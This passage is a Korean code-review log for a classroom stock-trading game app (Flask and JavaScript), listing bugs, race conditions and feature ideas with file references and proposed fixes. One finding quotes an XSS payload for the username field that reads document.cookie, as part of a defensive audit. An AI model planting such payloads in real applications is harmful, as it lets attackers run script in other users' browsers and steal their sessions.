- **`S.assetHistory`·`S.stocks` 방 전환 시 미초기화** (`app.js:19`, `app.js:691-694`, `app.js:1097-1109`): `goHome()`(`app.js:96`)·`doLogout()`(`app.js:89`)이 `S.user = null; S.room = null`만 리셋하고, `S.assetHistory`, `S.stocks`, `S.sectors`, `S.newsTs` 등 게임 중 누적 데이터는 초기화하지 않음. 같은 세션에서 다른 방에 재입장하면 이전 게임 자산 히스토리가 포트폴리오 탭 차트에 혼합 표시되고, 이전 방 종목 가격 대비 플래시 애니메이션(`app.js:1181-1191`)이 틀리게 발동됨. `showLanding()` 내(`app.js:82-85`) 또는 `stopPolling()` 내에 `S.assetHistory = []; S.stocks = []; S.sectors = []; S.newsTs = 0;` 4줄 추가로 해결.

---

## 2026-06-16 (3차)

### 추가하면 좋을 기능

- **`submit_quiz()` 게임 종료 후 현금 변경 방지** (`app.py:986-1014`): `get_quiz()`는 `room.status != 'active'` 체크가 있으나 `submit_quiz()`에는 없음. 학생이 퀴즈를 열어 두고 게임이 종료된 후 제출하면 `RoomMember.cash`가 변경돼 결과 화면의 자산과 엑셀 파일 수치가 달라질 수 있음. `app.py:987` 직후 `if room.status != 'active': return jsonify({'error': '게임이 종료되었습니다'}), 400` 한 줄 추가로 즉시 방지 가능.

- **`minigame_open()` 경쟁 조건으로 이중 일시정지 위험** (`app.py:738-745`): `state['count'] += 1` 직후 `if state['count'] == 1` 체크까지 Lock이 없음. Gunicorn 멀티 워커 또는 eventlet 환경에서 두 학생이 동시에 룰렛을 열면 두 요청 모두 `count == 1`로 평가해 `room.status = 'paused'`와 `room.paused_at` 설정이 중복 실행. 두 번째 `paused_at` 덮어쓰기로 `resume_room()`의 연장 시간이 틀어짐. `_room_services_lock` 과 같은 방식으로 `_rlt_active_lock = Lock()`을 추가하고 open/close 핸들러에서 count·auto_paused 변경을 원자적으로 실행 권장.

- **`force_sector_event()` 구(舊) 타임스탬프 재사용으로 이벤트 효과 즉시 소멸** (`stock_service.py:244`): `self._prices[sym] = (ts, new_price)`에서 기존 `ts`를 재사용. TTL이 이미 만료된 종목은 다음 `get_price()` 호출에서 즉시 새 무작위 가격으로 덮어씌어짐. `(ts, new_price)` → `(time.time(), new_price)`로 교체하면 최소 `_price_ttl`(기본 20초)동안 강제 이벤트 가격이 유지됨. `force_price()`의 동일 버그(`stock_service.py:216`)도 함께 수정 필요.

- **`_next_price()` 클램프 범위와 `force_price()` 허용 범위 불일치** (`stock_service.py:137`, `stock_service.py:215`): `force_price()`는 base×3.0까지 허용하지만 `_next_price()`는 base×1.4로 클램핑. 교사가 강제로 올린 가격이 한 틱(20초) 만에 base×1.4로 원상 복귀돼 수업 시연 효과가 사라짐. `stock_service.py:137`의 `min(base * 1.4, new_price)` → `min(base * 3.0, new_price)` 또는 force_price 후 `_current_biases[symbol] = direction`을 삽입해 모멘텀 유지 권장.

- **`export_rankings()` 함수 내부 `import openpyxl`** (`app.py:1081-1083`): `import openpyxl`, `from io import BytesIO`, `from openpyxl.styles import ...` 3줄이 라우트 함수 내부에 위치. `openpyxl` 미설치 환경에서 서버가 정상 시작됐다가 교사가 엑셀 내보내기를 누를 때만 `ImportError: 500`이 반환됨. 모듈 상단으로 이동하면 서버 시작 시 즉시 오류 감지 가능하고, 코드 파악도 쉬워짐.

- **`get_deposits()` 예금 이자 계산 시 일시정지 연장 게임 시간 미반영** (`app.py:652-658`): `total_seconds = room.duration_minutes * 60`으로 고정 계산하므로 진행자가 게임을 여러 번 일시정지해 전체 시간이 늘어났을 경우 이자 비율이 과다 계산됨. `total_seconds = max(room.duration_minutes * 60, (room.end_time - room.start_time).total_seconds()) if room.start_time and room.end_time else room.duration_minutes * 60` 처럼 실제 게임 총 시간을 기준으로 계산하면 정확도 향상.

- **`StockService._init_prices()` 전 종목 TTL 즉시 만료 초기화** (`stock_service.py:124`): `self._prices[sym] = (now - self._price_ttl, start)` 패턴으로 모든 종목 타임스탬프를 이미 만료된 상태로 설정. 학생 30명이 게임 시작 후 동시에 시장 탭을 로드하면 첫 번째 `get_price()` 호출에서 45개 종목 가격이 일제히 재계산되는 thundering herd 발생. `(now, start)`로 교체하면 초기 20초 동안 가격이 안정적으로 유지되고 첫 로드 시 서버 부하가 분산됨.

---

### 제거/단순화할 것들

- **`host_adjust()` `user_id` 누락 시 의미없는 DB 쿼리 실행** (`app.py:388-392`): `target_uid = d.get('user_id')`가 None이면 `RoomMember.query.filter_by(room_id=rid, user_id=None).first()`로 `WHERE user_id IS NULL` 쿼리가 실행됨. 결과는 None → 404로 처리되지만 불필요한 DB 쿼리 발생. `app.py:388` 직후 `if not target_uid: return jsonify({'error': 'user_id 필요'}), 400` 조기 반환으로 불필요한 쿼리와 모호한 오류 메시지를 동시에 제거 가능.

- **`api.get/post/del` 모두 HTTP 오류 응답 미처리** (`app.js:30-34`): `api.get()`, `api.post()`, `api.del()` 모두 `fetch(...).json()`을 바로 호출해 서버가 500 에러로 HTML 오류 페이지를 반환하거나 네트워크 오류가 발생하면 `.json()` 파싱 실패로 처리되지 않는 `SyntaxError`가 발생해 UI가 조용히 멈춤. `const r = await fetch(url, opts); if (!r.ok) return {error: \`HTTP \${r.status}\`}; return r.json();` 패턴으로 세 함수를 일관성 있게 수정하면 안정성이 대폭 향상됨.

- **`loadParticipantRankings()` 매 호출 시 스피너로 목록 초기화** (`app.js:676-694` 참조, 순위 렌더링 로직): 5초 폴링마다 `list.innerHTML = '<div class="loading-center"><span class="spinner"></span></div>'`로 기존 내용을 스피너로 덮어씌워 순위 목록이 깜빡임. `loadHostMembers()`처럼 데이터를 먼저 받아온 뒤 `innerHTML`을 교체하거나, `if (!list.children.length)` 조건으로 초기 로딩 시에만 스피너를 표시하면 깜빡임 없이 부드러운 업데이트 가능.

- **`room_dict()` 매 호출 시 `RoomMember.query.filter_by().count()` 실행** (`app.py:178`): `'member_count': RoomMember.query.filter_by(room_id=room.id).count()`가 `room_dict()` 호출마다 COUNT 쿼리를 실행. `get_room()`, `create_room()`, `join_room()`, `start_room()` 등 방 상태를 반환하는 모든 엔드포인트가 이를 호출해 불필요한 COUNT 쿼리가 반복. `Room` 모델에 `member_count = db.Column(db.Integer, default=0)` 컬럼 추가 후 `join_room()`·`kick_member()` 시 증감 업데이트하면 쿼리 1회 절약.

- **`goHome()` / `doLogout()` 에서 게임 중 누적 상태 미초기화** (`app.js:89-100`): `S.user = null; S.room = null`만 리셋하고 `S.assetHistory`, `S.stocks`, `S.sectors`, `S.newsTs` 등 게임 중 누적 데이터는 초기화하지 않음. 같은 세션에서 다른 방에 재입장하면 이전 게임 자산 히스토리가 포트폴리오 탭 차트에 혼합 표시되고, 이전 방 종목 가격 대비 플래시 애니메이션이 틀리게 발동됨. `showLanding()` 내 (`app.js:82`) `S.assetHistory = []; S.stocks = []; S.sectors = []; S.newsTs = 0;` 4줄 추가로 해결 가능.

- **`S.watchlist` 초기화 시 손상된 JSON으로 앱 전체 실패 가능** (`app.js:17`): `new Set(JSON.parse(localStorage.getItem('watchlist') || '[]'))`가 `S` 객체 리터럴 내부에 있어 `localStorage`에 손상된 JSON이 있으면 `JSON.parse` 예외가 발생해 `S` 전체 초기화 실패 → 이후 모든 전역 상태가 `undefined`. `let watchlistRaw = []; try { watchlistRaw = JSON.parse(localStorage.getItem('watchlist') || '[]'); } catch(e) {}` 방어 코드를 `S` 선언 직전에 추가하고 `S.watchlist = new Set(watchlistRaw)`로 분리하면 손상된 캐시로 인한 전체 앱 오류 방지.

- **`RLT_SEGS` 상수 완전한 dead code** (`app.js:820-826`): `const RLT_SEGS = [{label:'꽝',...}, ...]` 7줄이 선언되어 있지만 `openRouletteModal()`, `doRouletteSpin()`, `updateRltLegend()`, `updateRltWheel()` 어디서도 이 변수를 참조하지 않음. 스핀 결과는 서버 응답의 `data.seg_start/data.seg_end`를 직접 사용하고, 범례는 `data.multipliers/data.weights`를 사용. 완전히 삭제 가능.

---

## 2026-06-15 (2차)

### 추가하면 좋을 기능

- **게임 룰 설명 창 교사 커스터마이징 불가** (`index.html:803-931`, `models.py:25-38`): 이번 커밋(275615e)으로 추가된 게임 룰 창은 108줄의 HTML이 `index.html`에 하드코딩되어 교사가 수업 맞춤 룰(예: "1인당 종목 최대 3개", "데이 트레이딩 금지")을 추가할 방법이 없음. `Room` 모델에 `custom_note = db.Column(db.Text, nullable=True)` 컬럼을 추가하고 방 생성 시 선택 입력란을 두면, `room_dict()`를 통해 참여자에게 전달되어 룰 창 하단 "선생님 공지" 섹션에 표시 가능. `openRules()`에서 `S.room.custom_note`가 있으면 해당 요소를 보이게 하는 3줄 추가로 구현 완료.

- **`force_price()` / `force_sector_event()` 후 `_prev` 미갱신으로 강제 이벤트 직후 등락률 왜곡** (`stock_service.py:268-269`): `self._prev` 딕셔너리는 `_init_prices()`에서 초기화된 뒤 전혀 갱신되지 않음. 교사가 `-30%` 섹터 이벤트를 적용해도 `get_prev_close()`는 이벤트 이전 가격을 반환하므로, `get_stocks()` 응답의 `change_pct`가 게임 시작가 대비 누적 등락률로 표시됨. `force_price()` (line 232) 마지막과 `force_sector_event()` 루프 내부(line 244 직후)에 `self._prev[sym] = new_price`를 추가하면 이벤트 직후 시장 카드에 정확한 이벤트 기준 등락률이 보여 학생이 변화를 즉각 인식 가능.

- **개인 투자 성과 요약 리포트** (`app.py:622-640`, `models.py:65-76`): 결과 화면에는 최종 자산·수익률만 표시. `GET /api/rooms/<rid>/my-report` 엔드포인트를 추가해 `{best_stock, worst_stock, total_trades, most_traded_sector, quiz_count}`를 `RoomTransaction` 집계로 반환하면 결과 화면에 "내 투자 리포트" 카드로 표시 가능. 신규 모델 변경 없이 기존 테이블만으로 구현되며, 게임 종료 후 교사의 "왜 이 종목을 선택했나요?" 토론에 데이터 근거를 제공해 교육 효과 향상.

- **룰렛 `✕` 버튼이 스핀 애니메이션 중 동작해 결과 미표시** (`app.js:1002-1009`, `index.html:507`): d5c8e6d 커밋으로 추가된 `✕` 버튼이 `closeRoulette()`를 호출하는데, `doRouletteSpin()` 내 `await new Promise(r => setTimeout(r, 4300))` 대기 중에도 오버레이가 닫혀 4초 후 결과를 DOM에 기록해도 화면에 표시되지 않고 토스트만 남음. 2026-06-14 4차에서 오버레이 배경 탭 클릭 경로를 지적했으나 신규 버튼으로 같은 문제가 재발. `closeRoulette()` 첫 줄에 `if (_rltSpinning) return;` 한 줄만 추가하면 방지 가능.

- **복권 번호 무제한 재제출로 마감 직전 번호 변경 가능** (`app.py:902-903`): `lottery_pick()`에서 `cur['picks'][str(user.id)] = nums`가 항상 최신 제출로 덮어씀. 제출 후 번호를 계속 바꿔 유리한 번호를 선택할 수 있어 공정성 훼손. `if str(user.id) in cur['picks']: return jsonify({'ok': True, 'picks': cur['picks'][str(user.id)]})` 패턴으로 초기 제출 고정. 또는 프론트에서 제출 후 `_lotPickerSubmitted = true`로 설정해 버튼을 즉시 비활성화하면(로직 이미 있음, `app.js:2049` 근방) 재제출 방지.

- **`openRules()` 탭 상태 미초기화로 재오픈 시 이전 탭 잔류** (`app.js:2128-2135`): `openRules()`는 `openModal('modal-rules')`만 호출하고 탭 초기화를 하지 않음. 학생이 "복권" 탭을 보고 닫은 뒤 다시 열면 "기본 규칙" 대신 "복권" 탭이 기본 표시됨. `openRules()` 내부에 `document.querySelector('.rules-tab').click()` 또는 `switchRulesTab('basic', document.querySelector('.rules-tab'))` 한 줄을 추가하면 항상 첫 번째 탭으로 초기화되어 일관된 UX 제공.

---

### 제거/단순화할 것들

- **`get_price()` 내 차트 캐시 무효화가 `HISTORY_CACHE_TTL` 완전 무력화** (`stock_service.py:176-179`): 가격 TTL(기본 20초) 만료 시 해당 종목의 차트 캐시를 삭제해 `HISTORY_CACHE_TTL = 120`의 의도가 완전히 무력화됨. 모달을 닫고 21초 후 다시 열면 항상 다른 차트가 표시되어 2026-06-10에 지적한 "캐싱으로 일관된 차트 제공" 목표를 달성할 수 없음. `stock_service.py:176-179`의 `del self._history_cache[key]` 루프를 제거하면 됨. 강제 가격 조정 시 캐시 무효화는 `force_price()` (line 217-219)와 `force_sector_event()` (line 247-249)에 이미 구현되어 있으므로 충분.

- **`minigame_close()` / `_do_reveal()` deprecated `Room.query.get()` 사용** (`app.py:114`, `app.py:763`): 두 함수가 `Room.query.get(rid)` (SQLAlchemy 2.x 폐기 API)를 사용해 다른 라우트의 `Room.query.get_or_404(rid)` 패턴과도 불일치. `minigame_close()`에서는 `room`이 None이면 `.status` 접근 시 `AttributeError`가 발생할 수 있고, `_do_reveal()`에서도 동일 위험. `db.session.get(Room, rid)` + `if not room: return` 명시적 None 체크로 교체하면 안전성·일관성 동시 확보.

- **`get_history()` `interval` 파라미터가 함수 본문에서 완전히 무시됨** (`stock_service.py:271`, `app.py:511`): `get_history(symbol, period, interval)` 서명에 `interval`이 있지만 함수 내부에서 전혀 사용되지 않음. `app.py:511`에서 `'5m'`, `'30m'`, `'1wk'` 등을 전달하나 모두 무시되어 기간에 상관없이 일봉 간격(86400초)으로 날짜를 계산. `interval_secs = {'5m': 300, '30m': 1800, '1d': 86400, '1wk': 604800}.get(interval, 86400)` 매핑을 `stock_service.py:283` 직전에 추가하고, line 287의 `i * 86400`을 `i * interval_secs`로 교체하면 기간에 맞는 봉 간격 표시 가능.

- **`_next_price()` 가격 상한(base×1.4)과 `force_price()` 허용 상한(base×3.0) 불일치로 강제 조정 즉시 소멸** (`stock_service.py:137`, `stock_service.py:215`): `force_price()`로 base×2.0까지 올려도 다음 TTL 만료 시 `_next_price()`가 `min(base*1.4, new_price)`로 즉시 클램핑. 교사의 극단적 가격 조정 효과가 한 틱(20초)만에 사라져 수업 시연 효과가 없음. 수정 방법 1: `force_price()` 호출 후 해당 종목의 타임스탬프를 `now + price_ttl * 2`로 연장해 2틱 동안 강제 가격 유지. 수정 방법 2: `stock_service.py:137`의 클램프 범위를 `base * 3.0`까지 확대해 `force_price()` 허용 범위와 일치시킴.

- **`export_rankings()` 함수 내부 `import openpyxl`** (`app.py:1081-1083`): `import openpyxl`, `from io import BytesIO`, `from openpyxl.styles import ...` 3줄이 라우트 함수 내부에 위치. `openpyxl` 미설치 환경에서 서버가 정상 시작되다가 교사가 엑셀 내보내기 버튼을 누를 때만 `ImportError`가 500 응답으로 반환됨. 모듈 상단으로 이동하면 서버 시작 시 즉시 오류 감지 가능. `BytesIO`는 표준 라이브러리이므로 영향 없으나 `openpyxl`은 외부 패키지 — `try: import openpyxl \nexcept ImportError: openpyxl = None` 패턴으로 서버 시작 로그에서 명시적 경고 표시 권장.

- **`_rlt_active` 카운터 비원자적 업데이트로 다중 일시정지 위험** (`app.py:738-746`): `state['count'] += 1` 직후 `state['count'] == 1` 체크까지 Lock이 없음. Flask 개발 서버(단일 스레드)에서는 무관하나 Gunicorn 멀티 워커나 eventlet 환경에서 두 학생이 동시에 룰렛을 열면 두 요청이 모두 `count == 1`로 평가해 `room.status = 'paused'` + `paused_at` 설정을 중복 실행 가능. 두 번째 `paused_at` 덮어쓰기로 이후 `resume_room()` 타이머 연장값이 틀어짐. `_room_services_lock`과 같은 방식으로 `_rlt_active_lock = Lock()`을 추가하고 `open` / `close` 핸들러에서 해당 방의 count·auto_paused 변경을 원자적으로 실행하는 것이 안전.

---

## 2026-06-17

### 추가하면 좋을 기능

- **룰렛 일시정지 영구 고착 방지 타임아웃** (`app.py:738-771`): 학생 브라우저가 룰렛 오버레이 열린 채로 비정상 종료되면 `_rlt_active[rid]['count']`가 1 이상으로 고착돼 `minigame_close`가 호출되지 않음 → 게임이 영구 일시정지 상태 유지. 교사가 수동 재개할 때까지 아무도 거래 불가. 해결책: `minigame_open` 호출 시 `threading.Timer(120, lambda: _force_resume(rid))` 같은 안전망 타이머를 등록하고, `minigame_close`에서 취소. 또는 `_rlt_active[rid]` 항목에 `opened_at` 타임스탬프를 기록하고, `get_room_status()` 폴링 응답에서 120초 초과 룰렛 세션을 자동 정리.

- **퀴즈 중복 출제 방지** (`app.py:968-982`): `get_quiz()` 라우트가 `random.choice(QUIZ_QUESTIONS)` 단순 랜덤을 사용해 60초 쿨다운 직후 동일 학생에게 같은 문제가 다시 출제될 수 있음. `_quiz_state[rid][uid]` 딕셔너리에 `'seen': set()` 필드를 추가하고, `seen`에 없는 문제 중에서만 선택하도록 수정. 전체 문제를 소진하면 `seen`을 초기화해 순환.

- **`host_adjust` 모달에 총 자산 표시** (`app.js:452-460`, `app.py:393`): 현재 교사가 학생 현금을 조정할 때 모달에 현금 잔액만 표시(`member.cash`). 주식을 많이 보유한 학생은 현금이 거의 없어도 총자산이 매우 크므로 현금 조정 효과가 미미함을 교사가 파악하기 어려움. `/api/rooms/<rid>/rankings` 응답의 `total` 값을 `host_adjust` 모달에 "총자산: ₩ X" 형태로 함께 표시하면 교사가 조정 필요 여부를 즉시 판단 가능.

- **`force_price()` `show_hint` 파라미터화** (`stock_service.py:208-232`): `force_price()` 내부에서 `'show_hint': True`가 하드코딩되어 있어 교사가 가격을 강제 조정하면 항상 방향 힌트가 뉴스로 노출됨. 교사가 조용히 가격만 조정하고 싶은 상황(예: 오류 수정)에 대응 불가. `force_price(symbol, pct, room_id, show_hint=True)` 형태로 파라미터를 추가하고, `/api/rooms/<rid>/force_price` 라우트(`app.py:488`)에서 `request.json.get('show_hint', True)`로 전달하면 선택적 힌트 공개 가능.

### 제거/단순화할 것들

- **`enter()` IntegrityError 미처리로 500 반환** (`app.py:208-219`): 두 클라이언트가 동시에 같은 username으로 `/api/auth/enter`를 요청하면 둘 다 `User.query.filter_by(username=...)` 조회에서 None을 얻고, 두 번째 `db.session.commit()`에서 `IntegrityError`가 발생해 클라이언트에게 500 HTML이 반환됨. `api.post()`는 JSON 파싱을 시도해 `SyntaxError`로 이어짐. `db.session.commit()` 직후 `except IntegrityError`를 추가하고 롤백 후 기존 사용자를 재조회하는 패턴으로 수정하면 동시 가입 시 안전.

- **`openStockModal()` 항상 `'1mo'` 차트로 초기화** (`app.js:1221-1224`): 사용자가 `'1wk'`로 기간을 바꿔 차트를 보다가 다른 종목을 클릭하면 `openStockModal()`이 `loadChart('1mo')`를 무조건 호출해 선택했던 기간 정보가 소멸. 전역 변수 `S.lastChartPeriod = '1mo'` (기본값)를 두고, 기간 버튼 클릭 시 업데이트, `openStockModal()`에서 `loadChart(S.lastChartPeriod)`로 호출하면 모달 간 기간 선택 상태 유지.

- **`goHome()` / `doLogout()` 복권 관련 상태 미초기화** (`app.js:96-100`, `app.js:557-559`): `_lotParticipantPicks`, `_lotPickerSubmitted`, `_lotResultRound`, `_lotPolling` 변수가 `enterParticipantGame()`에서만 초기화되고 `goHome()`·`doLogout()`에서는 초기화되지 않음. 학생이 복권 진행 중 홈으로 나갔다가 다른 방에 재입장하면 이전 복권 선택값과 제출 상태가 남아 있어 복권 화면이 오작동. `goHome()` 내부(line 96)에 `_stopLotPolling(); _lotParticipantPicks = []; _lotPickerSubmitted = false; _lotResultRound = null;` 4줄 추가로 해결.

- **`minigame_open` 중복 호출 시 count 이중 증가** (`app.py:738-746`): 학생 브라우저가 룰렛 오버레이 요청을 재시도(네트워크 지연·이중 탭)하면 동일 사용자가 `minigame_open`을 두 번 호출해 `state['count']`가 2 증가. 이후 `minigame_close` 한 번으로는 count가 1로 남아 게임 일시정지가 해제되지 않음. `_rlt_active[rid]` 에 `'openers': set()` 필드를 추가하고, `user_id`가 이미 `openers`에 있으면 count 증가를 건너뛰는 멱등성 처리가 필요.

- **`refreshMyRank()` 자산 히스토리 X축 레이블에 로컬 시계 사용** (`app.js:690-693`): 자산 추이 차트 X축 레이블을 `new Date()`(클라이언트 로컬 시각)로 생성해 자정 근처나 학생 기기 시계가 다를 때 그래프 시간 축이 어긋남. 서버 응답에 `server_time` 필드를 포함시키거나, `portfolio` API 응답의 `timestamp` 값을 기준으로 레이블을 계산하면 서버 기준 KST로 일관된 시간 표시 가능.

---

## 2026-06-17 (2차)

### 추가하면 좋을 기능

- **시장 탭 실시간 섹터 성과 요약 바** (`app.js:1097-1117`, `stock_service.py:99`): `loadMarket()` 성공 후 `S.stocks`를 섹터별로 그룹화해 평균 `change_pct`를 계산하고, 섹터 필터 버튼 위에 `"반도체 +1.2% | IT −0.5% | 배터리 +0.8%"` 형태의 한 줄 요약 바를 렌더링하면 학생이 종목 카드를 일일이 열지 않아도 강세/약세 섹터를 한눈에 파악 가능. `renderSectors()` 내부(`app.js:1111`)에 `const sectorAvg = ...` 계산 블록과 요약 텍스트 DOM 업데이트 10줄 추가로 서버 변경 없이 구현 완료.

- **진행자 실시간 게임 통계 카드** (`app.py:601-617`, `app.py:620-640`): `GET /api/rooms/<rid>/host/stats` 엔드포인트를 추가해 `{total_trades, total_volume, most_active_username, most_traded_symbol, quiz_correct_rate, roulette_spin_count}`를 `RoomTransaction` 집계 쿼리로 반환. 진행자 대시보드 "순위" 탭 하단에 "📊 게임 통계" 카드를 두고 10초마다 갱신하면 교사가 "지금까지 OOO건 거래, OO이 가장 많이 거래" 형태로 수업 개입 포인트를 실시간 파악 가능. 서버 30줄, 클라이언트 15줄 내 완성.

- **타이머 1분 전 모바일 진동 알림** (`app.js:710-716`): `startTimer()`의 `tick()` 함수에서 `rem === 60`이 처음 감지될 때 `navigator.vibrate?.([200, 100, 200])`을 호출하면, 스마트폰을 책상에 올려 둔 학생이 화면을 보지 않아도 진동으로 마감 1분 전을 인식 가능. `app.js:712` 직후 한 줄 추가로 구현되며 Web Vibration API 미지원 기기에서는 `?.`로 안전하게 무시됨. 동시에 `AudioContext.createOscillator()` 0.1초 비프음을 추가하면 소리 알림도 제공 가능 (볼륨 0.3 이하 권장).

- **종목 모달 보유 평가손익 배지** (`app.js:1195-1224`): `openStockModal()` 내 `port` 응답에서 이미 보유 종목의 `avg_price`를 알 수 있음. `h.avg_price`를 `S.tradeAvgPrice`로 저장하고, `ms-holding` 아래에 `<div id="ms-pnl">` 요소를 추가해 `((S.tradePrice - S.tradeAvgPrice) / S.tradeAvgPrice * 100).toFixed(2) + '%'`를 색상 있는 뱃지로 표시하면 학생이 모달을 열자마자 현재 포지션 수익률을 즉시 확인 가능. 포트폴리오 탭으로 이동하지 않아도 돼 매수/매도 결정 속도 향상. 서버 변경 없이 클라이언트 5줄 수정으로 구현 가능.

- **스마트 최대 매수 수량 실시간 힌트 레이블** (`app.js:1274-1277`): `updateTotal()` 함수가 이미 `trade-total`을 갱신하므로, 같은 함수 내에서 `Math.floor(S.tradeCash / S.tradePrice)`와 현재 입력값을 비교해 `"최대 N주 구매 가능"` 레이블을 수량 입력창 아래에 표시하면 학생이 잔액 대비 살 수 있는 최대 수량을 계산할 필요가 없어짐. `setMaxBuy()` 버튼(`app.js:1279`)은 이미 구현되어 있으나 버튼을 눌러야만 알 수 있는 반면, 실시간 힌트는 수량을 입력하면서 바로 확인 가능. API 호출 없이 `app.js:1276` 한 줄 추가로 구현 완료.

- **진행자 순위표에 학생별 활동 배지** (`app.js:383-395`, `app.py:344-354`): `host_members()` 응답에 `{trade_count, quiz_taken}` 필드를 추가(`RoomTransaction.query.filter_by(room_id=rid, user_id=m.user_id).count()`로 계산)하고, 진행자 순위 행에 `<span>💹 N건</span>` 거래 횟수 배지를 렌더링. 거래를 한 번도 안 한 학생(0건)에 `⚠` 아이콘을 표시하면 교사가 "OO 학생, 아직 거래를 시작 안 했네요" 식으로 개입 포인트를 즉시 파악 가능. 서버 5줄 + 클라이언트 3줄 수정.

---

### 제거/단순화할 것들

- **`enter()` 유효성 검사 메시지-코드 불일치** (`app.py:212-213`): `len(u) > 30`이면 400을 반환하지만 오류 메시지는 `"닉네임은 2~20자 사이여야 합니다."`로 20자라고 표기. 21~30자 닉네임을 입력한 사용자는 오류 없이 성공하는데 메시지에는 "20자 이하"가 맞다고 나와 혼란 유발. `len(u) > 20`으로 코드를 수정하거나 메시지를 `"2~30자 사이여야 합니다."`로 수정해 일관성 확보 필요.

- **`get_lottery()` 동시 폴링으로 `_do_reveal()` 중복 호출 위험** (`app.py:856-862`): 참여자 30명이 동시에 3초 폴링을 수행하면 `cur['state'] == 'drawing'` 조건이 여러 요청에서 동시에 참이 될 수 있음. `_do_reveal()` 내부에서 `cur['state'] = 'revealed'`를 설정하기 전에 두 번째 요청이 진입하면 `RoomMember.cash` 이중 지급이 발생. `_lots` 딕셔너리 수정이 Lock 없이 이루어지므로 Thread-safety 보장 불가. `cur['state'] = 'drawing'` 체크 직전에 `if cur.get('state') == 'drawing': cur['state'] = 'revealing'` 원자적 선점 처리를 추가하거나, `_lots` 전역 접근을 `threading.Lock()`으로 보호 권장 (`app.py:73` 근방에 `_lots_lock = Lock()` 추가).

- **`openRouletteModal()` 스핀 소진 시 무음 실패** (`app.js:897-920`): `if (data.error || data.spins_left <= 0) return;` 조건에서 `spins_left <= 0`이면 아무 피드백 없이 조용히 종료. 학생이 룰렛 버튼을 눌러도 화면에 아무 반응이 없어 앱이 멈춘 것으로 오해할 수 있음. `if (data.spins_left <= 0) { toast('룰렛 기회를 모두 사용했습니다.', 'info'); return; }` 한 줄로 사용자 피드백 제공. 마찬가지로 `data.error`가 있을 때도 현재는 토스트 없이 실패하므로 `toast(data.error, 'error');` 추가 권장.

- **`submit_quiz()` `bool(d.get('answer'))` 문자열 `'false'`를 `True`로 처리** (`app.py:994`): JSON body로 `{"answer": false}`를 정상 전송하면 `bool(False) = False`로 올바르나, API를 직접 curl로 호출하거나 클라이언트 버그로 `{"answer": "false"}`(문자열)가 전송되면 `bool("false") = True`가 되어 오답이 정답으로 처리됨. `user_answer = d.get('answer') is True` 또는 `if d.get('answer') not in (True, False): return jsonify({'error': '잘못된 답변'}), 400` 검증을 추가하면 타입 강제 변환 취약점 차단 가능.

- **`join_room()` 일시정지 상태 게임 중 신규 참여 허용** (`app.py:268`): `room.status == 'ended'`만 차단하므로 복권·룰렛으로 게임이 `'paused'` 상태일 때도 새 학생이 입장 가능. 복권 `drawing` 단계에서 입장한 학생은 `picks`가 없어 당첨 결과 0원을 받고, 갑자기 게임 화면으로 진입해 상황을 파악하지 못한 채 혼란 유발. `join_room()` 응답에 `'late_join': room.status in ('active', 'paused')`를 포함시키고, 클라이언트에서 `late_join`이 `true`이면 "게임이 이미 진행 중입니다 — 상황을 파악하고 거래를 시작하세요" 안내 토스트를 표시하는 것으로 최소한의 사용자 경험 보호 가능.

- **`loadParticipantRankings()` / `loadResults()` `e.username` XSS 취약점** (`app.js:1549`, `app.js:1614`): 순위 목록과 결과 화면에서 `e.username`을 template literal로 innerHTML에 직접 삽입. 사용자명에 `<img src=x onerror="alert(document.cookie)">` 또는 `<script>` 태그를 포함시켜 입장하면 다른 학생의 브라우저에서 임의 JS가 실행될 수 있음. `escHtml()` 함수가 `app.js:815`에 이미 정의되어 있으므로 `${e.username}` → `${escHtml(e.username)}`으로 교체하면 즉시 방지 가능. 진행자 화면의 `loadHostMembers()`(`app.js:383`)와 거래 내역의 `t.note`(`app.js:1449`)도 동일하게 escaping 필요.

- **`S.depositWarningShown` 방 변경 시 미초기화** (`app.js:12`, `app.js:96-100`): `S` 객체 초기화 시 `depositWarningShown: false`로 설정되지만, `goHome()`·`doLogout()`에서 `S.user = null; S.room = null`만 리셋하고 `S.depositWarningShown`은 초기화하지 않음. 학생이 첫 번째 게임에서 예금 만기 경고를 받은 후 홈으로 나갔다가 두 번째 게임에 예금을 하면, `checkDepositMaturity()` 첫 줄의 `if (S.depositWarningShown) return;` 가드(`app.js:638`)에 걸려 만기 임박 팝업이 절대 표시되지 않음. 2026-06-16에 지적한 `S.assetHistory` 미초기화와 동일한 패턴 — `showLanding()`(`app.js:82`) 또는 `stopPolling()` 내에서 `S.depositWarningShown = false;` 1줄 추가로 해결.

---

## 2026-06-18 (이전 분석 미수정 현황 점검)

### 여전히 미수정된 고우선순위 항목

- **`force_price()` / `force_sector_event()` ts 재사용** (`stock_service.py:216`, `stock_service.py:244`): 강제 가격 조정이 다음 TTL에 즉시 소멸. `(ts, new_price)` → `(time.time(), new_price)` 한 줄 수정. 06-13, 06-14 (3차), 06-15 (2차), 06-16 (3차)에 걸쳐 반복 지적됐으나 미수정.

- **`api.get/post/del` HTTP 오류 응답 미처리** (`app.js:30-34`): 서버 500 시 `SyntaxError`로 UI가 조용히 멈춤. 06-14, 06-16 (2차), 06-16 (3차)에 걸쳐 반복 지적됐으나 미수정.

- **`lobby_members()` 403 반환으로 참여자 로비 목록 항상 빈칸** (`app.py:465`): 06-12, 06-14 (4차)에 지적됐으나 미수정.

- **`loadParticipantRankings()` 매 호출마다 스피너로 목록 초기화 → 깜빡임** (`app.js:1543`): 06-14 (4차), 06-16 (3차)에 지적됐으나 미수정.

- **`submit_quiz()` room.status 체크 없음** (`app.py:1086`): 게임 종료 후에도 현금 변경 가능. 06-11, 06-15, 06-16 (3차), 06-17에 걸쳐 반복 지적됐으나 미수정.

- **`S.assetHistory`·`S.stocks` 방 전환 시 미초기화** (`app.js:89-100`): 06-16 (2차), 06-16 (3차)에 지적됐으나 미수정.

- **`export_rankings()` 함수 내부 `import openpyxl`** (`app.py:1180`): 06-14 (4차), 06-15 (2차), 06-16 (2차)에 지적됐으나 미수정.

- **`RLT_SEGS` dead code** (`app.js:820-826`): 06-14 (4차), 06-16, 06-16 (3차)에 지적됐으나 미수정.

---

## 2026-06-18

### 추가하면 좋을 기능

